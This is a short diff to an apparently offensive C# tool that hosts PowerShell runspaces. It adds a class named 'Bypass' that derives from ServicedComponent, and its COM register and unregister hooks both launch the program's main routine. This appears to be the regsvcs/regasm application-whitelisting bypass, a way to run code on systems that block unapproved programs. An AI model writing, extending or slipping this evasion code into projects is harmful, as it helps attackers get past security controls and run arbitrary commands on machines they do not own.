@@ -174,6 +174,7 @@ using System.Runtime.InteropServices;
 using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.EnterpriseServices;
 
 public class Program
     {
@@ -228,6 +229,21 @@ public class Program
             }
         }
         
+}
+
+public class Bypass : ServicedComponent
+{
+	[ComRegisterFunction]
+	public static void RegisterClass ( string key )
+	{
+		Program.Main(); 
+	}
+	
+	[ComUnregisterFunction]
+	public static void UnRegisterClass ( string key )
+	{
+		Program.Main(); 
+	}
 }
     
 [System.ComponentModel.RunInstaller(true)]
